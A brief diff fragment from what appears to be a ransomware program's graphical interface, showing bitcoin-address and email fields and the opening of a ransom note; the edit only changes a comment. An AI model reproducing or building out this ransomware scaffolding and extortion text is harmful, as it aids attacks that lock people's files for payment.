@@ -11,7 +11,7 @@ class RansomwareGUI(QMainWindow):
         self.btcAdd = ""
         self.email = ""
 
-        # Define ransom notes
+        # Define ransom notess
         self.ransomNote = f"""
         All Your Files Have Been Encrypted\n
         At the end of the day we just want to get paid\n
